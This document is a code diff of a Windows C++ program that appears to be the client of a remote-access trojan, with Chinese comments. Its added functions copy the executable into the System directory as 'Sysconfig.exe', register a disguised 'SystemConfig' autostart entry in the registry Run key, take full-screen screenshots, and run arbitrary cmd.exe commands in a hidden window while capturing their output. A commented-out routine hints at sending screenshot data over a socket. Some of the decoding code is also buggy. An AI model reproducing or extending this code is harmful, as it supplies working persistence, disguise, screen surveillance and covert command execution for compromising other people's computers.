@@ -159,6 +159,65 @@ void base58encode(char plainText[])
 	}
 }
 
+bool base58decode(unsigned char* src)  // 解码
+{
+	static char b58n[] =
+	{
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1,  0,  1,  2,  3,  4,  5,  6,  7,  8, -1, -1, -1, -1, -1, -1,
+		-1,  9, 10, 11, 12, 13, 14, 15, 16, -1, 17, 18, 19, 20, 21, -1,
+		22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, -1, -1, -1, -1, -1,
+		-1, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, -1, 44, 45, 46,
+		47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+	};
+	size_t len = strlen((char*)src);
+	size_t rlen = (len / 4 + 1) * 3;
+	unsigned char* ret = (unsigned char*)malloc(rlen);
+	unsigned char* rptr = ret + rlen;
+	size_t i;
+	unsigned char* ptr;
+	for (i = 0; i < len; i++)
+	{
+		char rest = b58n[src[i]];
+		if (rest < 0)
+		{
+			free(ret);
+			return NULL;
+		}
+		for (ptr = ret + rlen - 1; ptr >= rptr; ptr--)
+		{
+			unsigned int c = rest + *ptr * 58;
+			*ptr = c % 256;
+			rest = c / 256;
+		}
+		if (rest > 0)
+		{
+			rptr--;
+			if (rptr < ret)
+			{
+				free(ret);
+				return NULL;
+			}
+			*rptr = rest;
+		}
+	}
+	for (i = 0; i < ret + rlen - rptr; i++)
+		ret[i] = rptr[i];
+	ret[i] = 0;
+	memcpy(src, ret, strlen((char*)src));
+	return true;
+}
+
 void base64encode(char* str)
 {
 	long len;
@@ -200,10 +259,61 @@ void base64encode(char* str)
 	strcpy(str, res);
 }
 
+void base64decode(char* str)
+{
+	int table[] = { 0,0,0,0,0,0,0,0,0,0,0,0,
+			 0,0,0,0,0,0,0,0,0,0,0,0,
+			 0,0,0,0,0,0,0,0,0,0,0,0,
+			 0,0,0,0,0,0,0,62,0,0,0,
+			 63,52,53,54,55,56,57,58,
+			 59,60,61,0,0,0,0,0,0,0,0,
+			 1,2,3,4,5,6,7,8,9,10,11,12,
+			 13,14,15,16,17,18,19,20,21,
+			 22,23,24,25,0,0,0,0,0,0,26,
+			 27,28,29,30,31,32,33,34,35,
+			 36,37,38,39,40,41,42,43,44,
+			 45,46,47,48,49,50,51
+	};
+	long len;
+	long str_len;
+	char* res;
+	int i, j;
+
+	//计算解码后的字符串长度  
+	len = strlen(str);
+	//判断编码后的字符串后是否有=  
+	if (strstr(str, "=="))
+		str_len = len / 4 * 3 - 2;
+	else if (strstr(str, "="))
+		str_len = len / 4 * 3 - 1;
+	else
+		str_len = len / 4 * 3;
+
+	res = (char*)malloc(sizeof(char) * str_len + 1);
+	res[str_len] = '\0';
+
+	//以4个字符为一位进行解码  
+	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
+	{
+		res[j] = ((char)table[str[i]]) << 2 | (((char)table[str[i + 1]]) >> 4); //取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  
+		res[j + 1] = (((char)table[str[i + 1]]) << 4) | (((char)table[str[i + 2]]) >> 2); //取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  
+		res[j + 2] = (((char)table[str[i + 2]]) << 6) | ((char)table[str[i + 3]]); //取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  
+	}
+
+	strcpy(str, res);
+
+}
+
 void encode(char* text)
 {
 	base58encode(text);
 	base64encode(text);
+}
+
+void decode(char* pwd)
+{
+	base58decode((unsigned char*)pwd);
+	base64decode(pwd);
 }
 
 void ScreenShot(LPCTSTR s)
@@ -221,22 +331,23 @@ void ScreenShot(LPCTSTR s)
 	image.Save(s, Gdiplus::ImageFormatPNG);//ImageFormatJPEG
 }
 
-void readSrc()
-{
-	// 1. 打开图片文件
-	ifstream Src("C:\\Windows\\Screenshots.bmp", ifstream::in | ios::binary);
-	// 2. 计算图片长度
-	Src.seekg(0, Src.end);  //将文件流指针定位到流的末尾
-	int length = Src.tellg();
-	Src.seekg(0, Src.beg);  //将文件流指针重新定位到流的开始
-	// 3. 创建内存缓存区
-	char* buffer = new char[length];
-	// 4. 读取图片
-	Src.read(buffer, length);
-	// 到此，图片已经成功的被读取到内存（buffer）中
-	printf("%s\n", buffer);
-	delete[] buffer;
-}
+//void readSrc(SOCKET fd)
+//{
+//	// 1. 打开图片文件
+//	ifstream Src("C:\\Windows\\Screenshots.bmp", ifstream::in | ios::binary);
+//	// 2. 计算图片长度
+//	Src.seekg(0, Src.end);  //将文件流指针定位到流的末尾
+//	int length = Src.tellg();
+//	Src.seekg(0, Src.beg);  //将文件流指针重新定位到流的开始
+//	// 3. 创建内存缓存区
+//	char* buffer = new char[length];
+//	// 4. 读取图片
+//	Src.read(buffer, length);
+//	// 到此，图片已经成功的被读取到内存（buffer）中
+//	cout << buffer << endl;
+//	//send(fd, buffer, strlen(buffer), 0);
+//	delete[] buffer;
+//}
 
 void GetFileName(char FileName[FileNameRow][FileNameCol])
 {
@@ -277,53 +388,222 @@ void GetFileName(char FileName[FileNameRow][FileNameCol])
 	}
 }
 
-void ProcessProtect()
+int ComputerStart(char* pathName)
 {
-
-}
-
-void ComputerStart(char* pathName)
-{
-	GetCurrentDirectory(MAX_PATH, (LPWSTR)pathName);//设置字符集为多字节字符集  获取当前文件路径
-
-	sprintf(pathName, "%s\\", pathName);
-	strcat(pathName, "client.exe");//找到需要开机自启动的程序
-	//找到系统的启动项 
-	char* szSubKey = (char*)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 	HKEY hKey;
+	DWORD result;
 
-	//打开注册表启动项 
-	int k = RegOpenKeyExA(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey);
-	if (k == ERROR_SUCCESS)
+	//打开注册表
+	result = RegOpenKeyEx(
+		HKEY_LOCAL_MACHINE,
+		(LPCWSTR)(CString)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", // 要打开的注册表项名称
+		0,              // 保留参数必须填 0
+		KEY_SET_VALUE,  // 打开权限，写入
+		&hKey           // 打开之后的句柄
+	);
+
+	if (result != ERROR_SUCCESS)
 	{
-		//添加一个子Key,并设置值，MyStart为启动项名称，自定义设置；
-		RegSetValueEx(hKey, (LPCWSTR)(CString)"SelfStart", 0, REG_SZ, (BYTE*)pathName, strlen(pathName));
-		//关闭注册表
-		RegCloseKey(hKey);
-		printf("successs\n");
+		return 0;
 	}
-	else
+	// 在注册表中设置(没有则会新增一个值)
+	result = RegSetValueEx(
+		hKey,
+		(LPCWSTR)(CString)"SystemConfig", // 键名
+		0,                  // 保留参数必须填 0
+		REG_SZ,             // 键值类型为字符串
+		(const unsigned char*)pathName, // 字符串首地址
+		strlen(pathName)        // 字符串长度
+	);
+
+	if (result != ERROR_SUCCESS) 
 	{
-		printf("error:%d\n", k);
+		return 0;
 	}
+	//关闭注册表:
+	RegCloseKey(hKey);
 }
 
-int Execmd(char* shell, char* result)
+int copySelf(char* path)
 {
-	char buffer[BUFSIZ * 4 ];                         //定义缓冲区                        
-	FILE* pipe = _popen(shell, "r");            //打开管道，并执行命令 
-	if (!pipe)
-	{
-		return 0;                      //返回0表示运行失败 
+	char fileName[MAX_PATH];
+	char sysPath[MAX_PATH];
+	//获得该文件的完整路径
+	GetModuleFileName(NULL, (LPWSTR)fileName, sizeof(fileName));
+	//取得System目录的完整路径名，写入sysPath
+	GetSystemDirectory((LPWSTR)sysPath, sizeof(sysPath));
+	sprintf(path, "%s\\Sysconfig.exe", sysPath);
+	//将文件复制到系统目录
+	CopyFile((LPWSTR)fileName, (LPWSTR)path, TRUE);
+	return 0;
+}
+
+int CaptureImage(HWND hwnd, CHAR* dirPath, CHAR* filename)
+{
+	HANDLE hDIB;
+	HANDLE hFile;
+	DWORD dwBmpSize;
+	DWORD dwSizeofDIB;
+	DWORD dwBytesWritten;
+	CHAR FilePath[MAX_PATH];
+	HBITMAP hbmScreen = NULL;
+	BITMAP bmpScreen;
+	BITMAPFILEHEADER bmfHeader;
+	BITMAPINFOHEADER bi;
+	CHAR* lpbitmap;
+	INT width = GetSystemMetrics(SM_CXSCREEN);  // 屏幕宽
+	INT height = GetSystemMetrics(SM_CYSCREEN);  // 屏幕高
+	HDC hdcScreen = GetDC(NULL); // 全屏幕DC
+	HDC hdcMemDC = CreateCompatibleDC(hdcScreen); // 创建兼容内存DC
+
+	if (!hdcMemDC) goto done;
+
+	// 通过窗口DC 创建一个兼容位图
+	hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
+
+	if (!hbmScreen) goto done;
+
+	// 将位图块传送到兼容内存DC中
+	SelectObject(hdcMemDC, hbmScreen);
+	if (!BitBlt(
+		hdcMemDC,    // 目的DC
+		0, 0,        // 目的DC的 x,y 坐标
+		width, height, // 目的 DC 的宽高
+		hdcScreen,   // 来源DC
+		0, 0,        // 来源DC的 x,y 坐标
+		SRCCOPY))    // 粘贴方式
+		goto done;
+
+	// 获取位图信息并存放在 bmpScreen 中
+	GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
+
+	bi.biSize = sizeof(BITMAPINFOHEADER);
+	bi.biWidth = bmpScreen.bmWidth;
+	bi.biHeight = bmpScreen.bmHeight;
+	bi.biPlanes = 1;
+	bi.biBitCount = 32;
+	bi.biCompression = BI_RGB;
+	bi.biSizeImage = 0;
+	bi.biXPelsPerMeter = 0;
+	bi.biYPelsPerMeter = 0;
+	bi.biClrUsed = 0;
+	bi.biClrImportant = 0;
+
+	dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
+
+	// handle 指向进程默认的堆
+	hDIB = GlobalAlloc(GHND, dwBmpSize);
+	lpbitmap = (char*)GlobalLock(hDIB);
+
+	// 获取兼容位图的位并且拷贝结果到一个 lpbitmap 中.
+	GetDIBits(
+		hdcScreen,  // 设备环境句柄
+		hbmScreen,  // 位图句柄
+		0,          // 指定检索的第一个扫描线
+		(UINT)bmpScreen.bmHeight, // 指定检索的扫描线数
+		lpbitmap,   // 指向用来检索位图数据的缓冲区的指针
+		(BITMAPINFO*)&bi, // 该结构体保存位图的数据格式
+		DIB_RGB_COLORS // 颜色表由红、绿、蓝（RGB）三个直接值构成
+	);
+
+
+	wsprintf((LPWSTR)FilePath, (LPWSTR)"%s\\%s.bmp", dirPath, filename);
+
+	// 创建一个文件来保存文件截图
+	hFile = CreateFile(
+		(LPWSTR)FilePath,
+		GENERIC_WRITE,
+		0,
+		NULL,
+		CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+
+	// 将 图片头(headers)的大小, 加上位图的大小来获得整个文件的大小
+	dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+
+	// 设置 Offset 偏移至位图的位(bitmap bits)实际开始的地方
+	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
+
+	// 文件大小
+	bmfHeader.bfSize = dwSizeofDIB;
+
+	// 位图的 bfType 必须是字符串 "BM"
+	bmfHeader.bfType = 0x4D42; //BM
+
+	dwBytesWritten = 0;
+	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
+	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
+	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
+
+	// 解锁堆内存并释放
+	GlobalUnlock(hDIB);
+	GlobalFree(hDIB);
+
+	// 关闭文件句柄
+	CloseHandle(hFile);
+
+	// 清理资源
+done:
+	DeleteObject(hbmScreen);
+	DeleteObject(hdcMemDC);
+	ReleaseDC(NULL, hdcScreen);
+
+	Sleep(200);
+	//bmptojpg24x("screen.bmp", "screen.jpg", 50);
+
+	return 0;
+}
+
+int cmd(char* cmdStr, char* message)
+{
+	DWORD readByte = 0;
+	char command[BUFSIZ * 2] = { 0 };
+	char buf[BUFSIZ * 2] = { 0 }; //缓冲区
+
+	HANDLE hRead, hWrite;
+	STARTUPINFO si;         // 启动配置信息
+	PROCESS_INFORMATION pi; // 进程信息
+	SECURITY_ATTRIBUTES sa; // 管道安全属性
+
+	// 配置管道安全属性
+	sa.nLength = sizeof(sa);
+	sa.bInheritHandle = TRUE;
+	sa.lpSecurityDescriptor = NULL;
+
+	// 创建匿名管道，管道句柄是可被继承的
+	if (!CreatePipe(&hRead, &hWrite, &sa, BUFSIZ * 2)) {
+		return 1;
 	}
 
-	while (!feof(pipe))
+	// 配置 cmd 启动信息
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si); // 获取兼容大小
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
+	si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
+	si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头
+
+	// 拼接 cmd 命令
+	sprintf(command, "cmd.exe /c %s", cmdStr);
+
+	// 创建子进程,运行命令,子进程是可继承的
+	if (!CreateProcess(NULL, (LPWSTR)command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) 
 	{
-		if (fgets(buffer, BUFSIZ * 4, pipe))
-		{           //将管道输出到result中 
-			strcat(result, buffer);
-		}
+		CloseHandle(hRead);
+		CloseHandle(hWrite);
+		printf("error!");
+		return 1;
 	}
-	_pclose(pipe);                            //关闭管道 
-	return 1;                                 //返回1表示运行成功 
+	CloseHandle(hWrite);
+
+	//读取管道的read端,获得cmd输出
+	while (ReadFile(hRead, buf, BUFSIZ * 2, &readByte, NULL)) 
+	{
+		strcat(message, buf);
+		ZeroMemory(buf, BUFSIZ * 2);
+	}
+	CloseHandle(hRead);
+
+	return 0;
 }
